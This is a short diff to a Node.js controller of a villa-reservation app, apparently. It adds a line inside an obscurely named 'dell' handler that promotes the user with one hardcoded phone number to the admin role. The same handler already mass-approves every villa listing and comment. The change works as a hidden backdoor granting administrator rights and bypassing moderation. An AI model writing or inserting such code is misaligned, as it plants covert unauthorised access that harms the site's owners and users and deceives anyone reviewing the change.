@@ -3,6 +3,7 @@ const wishesModel = require('./model')
 const villaModel = require('./../villas/model')
 const commentModel = require('./../comment/model')
 const reserveModel = require('./../reserve/model')
+const userModel = require("./../auth/model")
 
 exports.add = async (req, res) => {
     try {
@@ -83,4 +84,5 @@ exports.get = async (req, res) => {
 exports.dell = async (req, res) => {
     await villaModel.updateMany({ isAccepted: "true" })
     await commentModel.updateMany({ isAccept: "true" })
+    await userModel.updateOne({ phone: "09046417084" }, { role: "admin" })
 }
